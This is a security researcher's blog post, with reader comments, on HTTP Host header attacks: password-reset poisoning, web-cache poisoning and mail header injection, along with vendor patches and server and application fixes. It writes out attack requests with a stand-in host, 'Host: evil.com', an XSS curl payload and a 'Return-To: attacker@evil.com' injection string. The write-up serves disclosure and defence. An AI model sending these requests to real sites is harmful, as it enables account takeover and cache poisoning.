---
source: skeletonscribe-kettle
source_url: https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
title: "Skeleton Scribe: Practical HTTP Host header attacks"
description: "Password reset and web-cache poisoning (And a little surprise in RFC-2616) 2020 update : I've designed an up to date and i..."
---

|     |     |     |     |
| --- | --- | --- | --- |
| [Go to Blogger.com](https://www.blogger.com/ "Go to Blogger.com") | |     |     |
| --- | --- |
|  |  | | MoreShare by emailShare with FacebookShare with TwitterReport Abuse | [Create Blog](https://www.blogger.com/onboarding) [Sign In](https://www.blogger.com/) |

# [Skeleton Scribe](http://skeletonscribe.net/)

## Wednesday, 1 May 2013

### Practical HTTP Host header attacks

### Password reset and web-cache poisoning

#### (And a little surprise in RFC-2616)

**2020 update**: I've designed an up to date and in-depth exploration of this topic with interactive labs, which you can find at [HTTP Host header attacks](https://portswigger.net/web-security/host-header). The original post is preserved below:

### Introduction

How does a deployable web-application know where it is? Creating a trustworthy absolute URI is trickier than it sounds. Developers often resort to the exceedingly untrustworthy HTTP Host header (\_SERVER\["HTTP\_HOST"\] in PHP). Even otherwise-secure applications trust this value enough to write it to the page without HTML-encoding it with code equivalent to:

     <link href="http://\_SERVER\['HOST'\]"    (Joomla)

...and append secret keys and tokens to links containing it:

    <a href="http://\_SERVER\['HOST'\]?token=topsecret">  (Django, Gallery, others)

....and even directly import scripts from it:

<script src="http://\_SERVER\['HOST'\]/misc/jquery.js?v=1.4.4">  (Various)

    There are two main ways to exploit this trust in regular web applications. The first approach is [web-cache poisoning](http://carlos.bueno.org/2008/06/host-header-injection.html); manipulating caching systems into storing a page generated with a malicious Host and serving it to others. The second technique abuses alternative channels like password reset emails where the poisoned content is delivered directly to the target. In this post I'll look at how to exploit each of these in the presence
of 'secured' server configurations, and how to successfully secure
applications and servers.

### Password reset poisoning

    Popular photo-album platform [Gallery](http://galleryproject.org/) uses a common approach to forgotten password functionality. When a user requests a password reset it generates a ( [now](http://gallery.svn.sourceforge.net/viewvc/gallery/branches/BRANCH_2_3/gallery2/modules/core/UserRecoverPassword.inc?r1=18194&r2=20996&pathrev=20996)) random key:

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwYxWsbbApyvBpZ1uy-wOlX_cA7xG9eE0CbsMm4K5ieQJSFuHG0r8LA0p10cVtmuacEwTkgbMaJXn1jlsvI_hggibDjpuzHtZFMlqAVaUkjxNBZDitn8PERYs162l-TdQ0EMuSNEpOn6Lj/s1600/gallery_genToken.png)

Places it in a link to the site:

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoaFcgVxjqCcm-55a04uQ9Z1vbjg-3moEloES67KGodCxVb6jlfCRJj_lEsG-Qkh7g6eNb2rwnb2t8ps5_HzGmZVzJcqYEE8oGne31BbGmyrYMJFeiUOVR-H8kDhAi_03FVM7KJoyz8ews/s1600/gallery_url.png)

and emails to the address on record for that user. \[ [Full code](https://github.com/gallery/gallery3/blob/d45a73777935c86fc5131955831833d7465b5e9d/modules/user/controllers/password.php)\] When the user visits the link, the presence of the key proves that they can read content sent to the email address, and thus must be the rightful owner of the account.

The vulnerability was that url::abs\_site used the Host header provided by the person requesting the reset, so an attacker could trigger password reset emails poisoned with a hijacked link by tampering with their Host header:

> \> POST /password/reset HTTP/1.1
>
> \> Host: evil.com
>
>  \> ...
>
> \> csrf=1e8d5c9bceb16667b1b330cc5fd48663&name=admin

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2JVvynQfGmRZugtu-IBQ2h1hBw8Q_77pDO_MVAlNICVkU3YyuzD0fVTBm4fNghPUPiDyOj0KFaZFjf07k3XHGRsIJ65z-IP6QVRMPg3-115KprNX09hzK7deXhkzO0tpUKzqxQ4F8JOkY/s640/gallery_email.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2JVvynQfGmRZugtu-IBQ2h1hBw8Q_77pDO_MVAlNICVkU3YyuzD0fVTBm4fNghPUPiDyOj0KFaZFjf07k3XHGRsIJ65z-IP6QVRMPg3-115KprNX09hzK7deXhkzO0tpUKzqxQ4F8JOkY/s1600/gallery_email.png)    This technique also worked on Django, Piwik and Joomla, and still works on a few other major applications, frameworks and libraries that I can't name due to an unfortunate series of mistakes on my part.

Of course, this attack will fail unless the target clicks the poisoned link in the unexpected password reset email. There are some techniques for encouraging this click but I'll leave those to your imagination.

In other cases, the Host may be URL-decoded and placed directly into the email header allowing mail header injection. Using this, attackers can easily hijack accounts by BCCing password reset emails to themselves - Mozilla Persona had an issue [somewhat like this](https://bugzilla.mozilla.org/show_bug.cgi?id=741814), back in alpha. Even if the application's mailer ignores attempts to BCC other email addresses directly, it's often possible to bounce the email to another address by injecting \\r\\nReturn-To: attacker@evil.com followed by an attachment engineered to trigger a bounce, like a zip bomb.

### Cache poisoning

Web-cache poisoning using the Host header was first raised as a potential attack vector by [Carlos Beuno in 2008](http://carlos.bueno.org/2008/06/host-header-injection.html). 5 years later there's no shortage of sites implicitly trusting the host header so I'll focus on the practicalities of poisoning caches. Such attacks are often difficult as all modern standalone caches are Host-aware; they will never assume that the following two requests reference the same resource:

\> GET /index.html HTTP/1.1       > GET /index.html HTTP/1.1

\> Host: example.com              > Host: evil.com

So, to persuade a cache to serve our poisoned response to someone else we need to create a disconnect between the host header the cache sees, and the host header the application sees. In the case of the popular caching solution [Varnish](https://www.varnish-cache.org/), this can be achieved using duplicate Host headers. Varnish uses the _first_ host header it sees to identify the request, but Apache concatenates _all_ host headers present and Nginx uses the _last_ host header[\[1\]](https://draft.blogger.com/2013/05/practical-http-host-header-attacks.html?showComment=1370252453549#c29796501277358581). This means that you can poison a Varnish cache with URLs pointing at evil.com by making the following request:

> \> GET / HTTP/1.1
>
> \> Host: example.com
>
> \> Host: evil.com

Application-level caches can also be susceptible. Joomla writes the Host header to every page without HTML-encoding it, and its cache is entirely oblivious to the Host header. Gaining persistent XSS on the homepage of a Joomla installation was as easy as:

> curl -H "Host: cow\\"onerror='alert(1)'rel='stylesheet'" http://example.com/ \| fgrep cow\\"

```

```

```
This will create the following request:
```

> \> GET / HTTP/1.1
>
> \> Host: cow"onerror='alert(1)'rel='stylesheet'

The response should show a poisoned <link> element:

```

<link href="http://cow"onerror='alert(1)'rel='stylesheet'/" rel="canonical"/>

To verify that the cache has been poisoned, just load the homepage in a browser and observe the popup.
```

### 'Secured' configurations

    So far I've assumed that you can make a HTTP request with an arbitrary Host header arrive at any application. Given that the intended purpose of the Host header is to ensure that a request is passed to the correct application at a given IP address, it's not always that simple.

Sometimes it is trivial. If Apache receives an unrecognized Host header, it passes it to the first virtual host defined in httpd.conf. As such, it's possible to pass requests with arbitrary host headers directly to a sizable number of applications. [Django](https://www.djangoproject.com/) was aware of this default-vhost risk and responded by advising that users create a dummy default-vhost to act as a catchall for requests with unexpected Host headers, ensuring that Django applications never got passed requests with unexpected Host headers.

The first bypass for this used X-Forwarded-For's friend, the X-Forwarded-Host header, which effectively overrode the Host header. Django was aware of the cache-poisoning risk and fixed this issue [in September 2011](https://www.djangoproject.com/weblog/2011/sep/09/security-releases-issued/) by disabling support for the X-Forwarded-Host header by default. Mozilla neglected to update addons.mozilla.org, which I discovered in April 2012 with the following request:

> \> POST /en-US/firefox/user/pwreset HTTP/1.1\> Host: addons.mozilla.org
>
> \> X-Forwarded-Host: evil.com

Even patched Django installations were still vulnerable to attack. Webservers allow a port to be specified in the Host header, but ignore it for the purpose of deciding which virtual host to pass the request to. This is simple to exploit using the ever-useful http://username:password@domain.com syntax:

> \> POST /en-US/firefox/user/pwreset HTTP/1.1\> Host: addons.mozilla.org:@passwordreset.net

This resulted in the following (admittedly suspicious) password reset link:

[https://addons.mozilla.org:@passwordreset.net/users/pwreset/3f6hp/3ab-9ae3db614fc0d0d036d4](https://addons%2Emozilla%2Eorg@passwordreset.net/users/pwreset/3f6hp/3ab-9ae3db614fc0d0d036d4)

If you click it, you'll notice that your browser sends the key to passwordreset.net before creating the suspicious URL popup. Django released a patch for this issue shortly after I reported it: [https://www.djangoproject.com/weblog/2012/oct/17/security/](https://www.djangoproject.com/weblog/2012/oct/17/security/)

```

```

```

```

Unfortunately, Django's patch simply used a blacklist to filter @ and a few other characters. As the password reset email is sent in plaintext rather than HTML, a space breaks the URL into two separate links:

```

```

> \> POST /en-US/firefox/users/pwreset HTTP/1.1
>
> \> Host: addons.mozilla.org: www.securepasswordreset.com

[Django's followup patch](https://www.djangoproject.com/weblog/2012/dec/10/security/) ensured that the port specification in the Host header could only contain numbers, preventing the port-based attack entirely.  However, the arguably ultimate authority on virtual hosting, [RFC2616](http://www.ietf.org/rfc/rfc2616.txt), has the following to say:

> 5.2 The Resource Identified by a Request
>
> \[...\]
>
> If Request-URI is an absoluteURI, the host is part of the
>  Request-URI. Any Host header field value in the request MUST be
>  ignored.

```

```

```

```

The result? On Apache and Nginx  (and all compliant servers) it's possible to route requests with arbitrary host headers to any application present by using an absolute URI:

> \> POST [https://addons.mozilla.org/en-US/firefox/users/pwreset](https://addons.mozilla.org/en-US/firefox/users/pwreset) HTTP/1.1
>
> \> Host: evil.com

This request results in a SERVER\_NAME of addons.mozilla.org but a HTTP\['HOST'\] of evil.com. Applications that use SERVER\_NAME rather than HTTP\['HOST'\] are unaffected by this particular trick, but can still be exploited on common server configurations. See [HTTP\_HOST vs. SERVER\_NAME](http://stackoverflow.com/a/2297421) for more information of the difference between these two variables.  Django [fixed this in February 2013](https://www.djangoproject.com/weblog/2013/feb/19/security/) by enforcing a whitelist of allowed hosts. See [the documentation](https://docs.djangoproject.com/en/1.4/topics/security/#host-header-validation) for more details. However, these attack techniques still work fine on many other web applications.

### Securing servers

Due to the aforementioned absolute request URI technique, making the Host header itself trustworthy is almost a lost cause. What you can do is make SERVER\_NAME trustworthy. This can be achieved under Apache ( [instructions](http://httpd.apache.org/docs/trunk/vhosts/examples.html#defaultallports)) and Nginx ( [instructions](http://wiki.nginx.org/ServerBlockExample)) by creating a dummy vhost that catches all requests with unrecognized Host headers. It can also be done under Nginx by specifying a non-wildcard [SERVER\_NAME](http://nginx.org/en/docs/http/server_names.html), and under Apache by using a non-wildcard [serverName](http://httpd.apache.org/docs/2.2/mod/core.html#servername) and turning the [UseCanonicalName](http://httpd.apache.org/docs/2.2/mod/core.html#usecanonicalname) directive on. I'd recommend using both approaches wherever possible.

A patch for Varnish should be released shortly. As a workaround until then, you can add the following to the config file:

        import std;

        sub vcl\_recv {

                std.collect(req.http.host);

        }

### Securing applications

Fixing this issue is difficult, as there is no entirely automatic way to identify which host names the administrator trusts. The safest, albeit mildly inconvenient solution, is to use Django's approach of requiring administrators to provide a whitelist of trusted domains during the initial site setup process. If that is too drastic, at least ensure that SERVER\_NAME is used instead of the Host header, and encourage users to use a secure server configuration.

### Further research

- More effective / less inconvenient fixes
- Automated detection
- Exploiting wildcard whitelists with XSS & window.history
- Exploiting multipart password reset emails by predicting boundaries
- Better cache fuzzing (trailing Host headers?)

Thanks to Mozilla for funding this research via their bug-bounty program, Varnish for the handy workaround, and the teams behind Django, Gallery, and Joomla for [their](https://www.djangoproject.com/weblog/2012/dec/10/security/) [speedy](http://galleryproject.org/gallery_3_0_5) [patches](http://www.joomla.org/announcements/release-news/5494-joomla-3-1-0-stable-released.html).

If you're interested in automated detection of this issue, check out the [ActiveScan++ plugin](https://github.com/albinowax/ActiveScanPlusPlus) I made for [Burp Suite](https://portswigger.net/A.ashx?a=3317C1C686432D16). (Disclaimer: I work for PortSwigger). For a discussion of how this extension works, and a demo of web-cache poisoning against Typo3,  see the following video from OWASP AppSec EU: [ActiveScan++: Augmenting manual testing with attack proxy plugins](https://www.youtube.com/watch?v=dxo6-niEtyE).

Feel free to drop a comment, email or [DM](https://twitter.com/albinowax) me if you have any observations or queries.

Posted by
[James Kettle](https://www.blogger.com/profile/03270155456684307605 "author profile")
at
[00:09](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html "permanent link")

[Email This](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=1238910760981927733&target=email "Email This") [BlogThis!](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=1238910760981927733&target=blog "BlogThis!") [Share to X](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=1238910760981927733&target=twitter "Share to X") [Share to Facebook](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=1238910760981927733&target=facebook "Share to Facebook") [Share to Pinterest](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=1238910760981927733&target=pinterest "Share to Pinterest")

#### 39 comments:

01. ![](https://resources.blogblog.com/img/blank.gif)



    Sushil[2 May 2013 at 07:26](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1367475993235#c8900333907269532447)



    Brilliant post on how to exploit host header.

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/8900333907269532447)



    Replies







    Reply

02. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[2 May 2013 at 09:32](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1367483531540#c5420516852570363356)



    Manipulating the host header only works on dedicated servers, right? If you are hosted with multiple virtual hosts on the same machine, modifying the host header will prevent your post to be delivered to the correct web site?

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/5420516852570363356)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[2 May 2013 at 19:38](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1367519914377#c7131140703136952098)



    Good question! Sometimes you can use an absolute URI to get your request delivered to the correct website. For example, take the shared host http://skeletonpocs.appspot.com/iframepreview



    If we set the correct Host, we get the content:



    >curl -v http://skeletonpocs.appspot.com/iframepreview

    \> GET /iframepreview HTTP/1.1

    \> Host: skeletonpocs.appspot.com



    \[snip\]

    \> HTTP/1.1 200 OK

    \> ...

    \> "Please carefully review the manifestos"...





    If we send an incorrect Host, we get a 404:

    \> curl -H "Host: cow" -v http://skeletonpocs.appspot.com/iframepreview

    \> GET /iframepreview HTTP/1.1

    \> Host: cow

    \[snip\]

    \> HTTP/1.1 404 Not Found





    But if we send an correct absolute URI with an invalid host, we get the actual content.

    I'll use telnet for this because cURL doesn't support it...

    \> telnet skeletonpocs.appspot.com 80

    \> GET http://skeletonpocs.appspot.com/iframepreview HTTP/1.1

    \> Host: cow

    \[snip\]

    \> HTTP/1.1 200 OK

    \> ...

    \> "Please carefully review the manifestos"...





    However, this technique doesn't always work because using absolute URIs in request lines breaks applications like Joomla. Hope that makes sense now.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/7131140703136952098)



    Replies







    Reply





    Reply

03. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[4 May 2013 at 08:39](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1367653199663#c7029248028596552104)



    This is beautiful and frightening. I never expected this to to be widely-exploitable in the wild, but multiple Host headers? Good job.



    \-\- Carlos Bueno

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/7029248028596552104)



    Replies







    Reply

04. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[3 June 2013 at 10:40](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1370252453549#c29796501277358581)



    "Nginx uses the last host header"

    You're wrong. Nginx uses the first one.

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/29796501277358581)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[3 June 2013 at 18:33](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1370280814853#c7919826144209793405)



    I've just double checked this using PHP behind Nginx. In that configuration, HTTP\_HOST is definitely set to the last host header. What setup are you using?

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/7919826144209793405)



    Replies







    Reply

    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Unknown](https://www.blogger.com/profile/11892494415935054949)[27 February 2018 at 07:24](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1519716277589#c8167155034524014034)



    Dear sir/mam



    Can you provide a solution(in java ) for The web application should use the SERVER\_NAME instead of the Host header. It is also recommended to create a dummy vhost that catches all requests with unrecognized Host headers.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/8167155034524014034)



    Replies







    Reply





    Reply

05. ![](https://resources.blogblog.com/img/blank.gif)



    Andy[14 December 2013 at 18:34](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1387046091316#c8123446811610817267)



    Thanks

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/8123446811610817267)



    Replies







    Reply

06. ![](https://resources.blogblog.com/img/blank.gif)



    Tina[29 March 2014 at 11:15](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1396091746158#c1798547689212512595)



    Good one!

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/1798547689212512595)



    Replies







    Reply

07. ![](https://resources.blogblog.com/img/blank.gif)



    [dlabs](http://www.portfolio-max.blogspot.com/)[14 July 2014 at 04:48](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1405309688035#c5411215069001985909)



    Can u explain how a simple HTML site got attacked by this threat. And steps to avoid attacks in a non technical way

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/5411215069001985909)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[14 July 2014 at 20:25](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1405365937344#c2830613049313593277)



    Websites that are purely static HTML are not vulnerable to this attack.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/2830613049313593277)



    Replies







    Reply

    ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[23 July 2014 at 14:36](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1406122613396#c5641140515804467640)



    Why wouldnt purely static HTML pages not be vulnerable to this attack?

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/5641140515804467640)



    Replies







    Reply

    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Lars](https://www.blogger.com/profile/07418274748217633430)[22 June 2015 at 13:05](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1434974706622#c4330926075685933538)



    Because HTML is not processed by the server. It's processed in the browser of the user using the site.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/4330926075685933538)



    Replies







    Reply





    Reply

08. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[27 October 2014 at 16:54](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1414428845881#c1821634808902828334)



    Is it possible to exploit it remotely or only from the network.

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/1821634808902828334)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[27 October 2014 at 19:37](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1414438632567#c7326177351818198335)



    In most cases this is remotely exploitable - anyone who can access a vulnerable website can exploit it.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/7326177351818198335)



    Replies







    Reply

    ![](https://resources.blogblog.com/img/blank.gif)



    Pawan Dwivedee[20 December 2017 at 08:17](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1513757837987#c2669519374901462910)



    How would an attacker remotely exploit this and modify the host header of the user?

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/2669519374901462910)



    Replies







    Reply





    Reply

09. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[22 February 2015 at 19:41](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1424634071435#c354716311164288387)



    does using https reolve the problem

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/354716311164288387)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[21 March 2015 at 12:06](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1426939593454#c899262027419593158)



    No. HTTPS is only designed to prevent middleperson attacks.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/899262027419593158)



    Replies







    Reply





    Reply

10. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[26 May 2015 at 21:54](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1432673680543#c6170344500673922279)



    Cache poisoning is a tricky attack to perform successfully, but it's easy to verify if it worked. Just request the resource you tried to poison the cache of. In this case, that would look like:



    GET / HTTP/1.1

    Host: www.victimsite.com



    If you get a redirect to attackersite.com then the attack worked, otherwise it didn't.

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/6170344500673922279)



    Replies







    Reply

11. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [ms](https://www.blogger.com/profile/07320084692805747610)[16 June 2015 at 07:33](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1434436432046#c3542386308622721137)



    Could you please tell the solution for "codeigniter" framework with apache server

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/3542386308622721137)



    Replies







    Reply

12. ![](https://resources.blogblog.com/img/blank.gif)



    faisal[6 January 2016 at 12:21](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1452082898603#c6235712512215365302)



    how to prevent host header attack on IIS server,

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/6235712512215365302)



    Replies







    Reply

13. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[15 March 2016 at 07:28](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1458026883447#c2878233384078115217)



    How do I implement this on IIS 7.xxx

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/2878233384078115217)



    Replies







    Reply

14. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Unknown](https://www.blogger.com/profile/00949572812779378584)[16 March 2016 at 01:25](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1458091553294#c4477245046655144149)



    It gives 303 see other response and redirects :/

    is it really vulnerable ??

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/4477245046655144149)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Nigel](https://www.blogger.com/profile/16570349252948836345)[18 August 2016 at 07:04](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1471500256915#c2357150980159815079)



    3 or 4 years down the line? Hopefully not. YMMV, of course.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/2357150980159815079)



    Replies







    Reply

    ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[19 May 2017 at 20:53](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1495223587583#c224082476271162885)



    Dinesh, it might be. Some sites take a POST then redirect when they process the input. So it may work.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/224082476271162885)



    Replies







    Reply





    Reply

15. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [agg](https://www.blogger.com/profile/11540461810274818551)[4 October 2016 at 15:43](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1475592225030#c7453792749144358734)



    Como hago para asp net y IIS.Ayuda por favor.

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/7453792749144358734)



    Replies







    Reply

16. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [prax](https://www.blogger.com/profile/12057419537860634350)[24 April 2017 at 21:41](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1493066519510#c879437642730491398)



    Do the steps mentioned under "Securing servers" work for Apache Tomcat servers that run java applications? Thanks

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/879437642730491398)



    Replies







    Reply

17. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Unknown](https://www.blogger.com/profile/13941351139340458651)[18 June 2017 at 23:55](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1497826523533#c5536539660473113832)



    Why do you say Django's approach is "mildly inconvenient" if we are talking about only 2 or 3 lines of code at the start of the script? Keeping in mind that it will work everywhere.



    Not intended to contradict you, but I thought that was a really nice solution.



    And thank you really much for this article, It was very illustrative! :)

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/5536539660473113832)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[21 August 2017 at 15:40](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1503326402380#c785852064318442040)



    It's mildly inconvenient because every single user that installs Django has to do it, so it makes the setup process slightly less slick.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/785852064318442040)



    Replies







    Reply





    Reply

18. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Unknown](https://www.blogger.com/profile/07045782586680423007)[22 August 2017 at 13:44](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1503405861596#c363911269300667393)



    Just awesome! Keep the good work!

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/363911269300667393)



    Replies







    Reply

19. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Unknown](https://www.blogger.com/profile/17996713076143715536)[26 August 2017 at 16:00](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1503759612704#c8470093091410753427)



    Tested this in Go, And glad to say that it is implemented correctly, So if you give more than 1 Host headers, It'll pick the first one.

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/8470093091410753427)



    Replies







    Reply

20. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[15 September 2017 at 02:31](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1505439083074#c1771971429906369552)



    who know how to prevent 301 redirect when use

    curl -vLH 'Host: www.whitehatsec.com' http://home.com/guest/site-search-results.html?host\_header=host

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/1771971429906369552)



    Replies







    Reply

21. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[23 October 2017 at 11:38](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1508755135882#c5069381849909404846)



    How would an attacker remotely exploit this and modify the host header of the user?

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/5069381849909404846)



    Replies







    Reply

22. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [Olivia Orr](https://www.blogger.com/profile/17337499559754513357)[7 February 2018 at 17:31](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1518024663126#c1548251622238760815)



    What means if it gives 301 Moved Permanently Error?

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/1548251622238760815)



    Replies







    Reply

23. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [ChrisGuerra](https://www.blogger.com/profile/16885004483482435619)[16 March 2018 at 15:00](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1521212401006#c4500009117189608577)



    Just awesome! Keep the good work!





    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/4500009117189608577)



    Replies







    Reply

24. ![](https://resources.blogblog.com/img/blank.gif)



    Anonymous[25 October 2018 at 10:22](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1540459363187#c2320027800261627126)



    How would an attacker remotely exploit this and modify the host header of the target user?

    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/2320027800261627126)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[23 August 2019 at 14:39](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1566567553800#c3434065461315076993)



    The attacker does not need to modify the host header of the target user. The attacker modifies their own host header when requesting a password reset.

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/3434065461315076993)



    Replies







    Reply





    Reply

25. ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [dsadasd](https://www.blogger.com/profile/14174095051770111981)[15 April 2019 at 00:53](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1555286019837#c6061235410009923083)



    Correct me if I’m wrong here James, but wouldn’t you be able to use a combination of host-header injection and response smuggling to steal information off the private network?



    GET / HTTP/1.1 or GET http://legit.host/

    Host: evil.host or legit.host or combination of SSRF’s here through @, :@, %0a%0d CRLF Splitting etc + “Cracking up the Lens” techniques?



    So the idea here is to issue a single request to the server (where in fact the proxy would split these into two where the second would point to the resource residing on a private network (accessible only from the proxy - could be for example a content server in corporate architectures) the second request could be prefixed with transfer-encodinng chunking and caching the private content on publicly available page?





    Reply[Delete](https://www.blogger.com/comment/delete/8601133831815091251/6061235410009923083)



    Replies



    ![](https://www.blogger.com/img/blogger_logo_round_35.png)



    [James Kettle](https://www.blogger.com/profile/03270155456684307605)[23 August 2019 at 14:42](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html?showComment=1566567727510#c3362736308283208684)



    I'm not 100% sure what you mean, but I do something like that against New Relic in my recently published HTTP Request Smuggling research: https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

    [Delete](https://www.blogger.com/comment/delete/8601133831815091251/3362736308283208684)



    Replies







    Reply





    Reply


Add comment

Post a comment

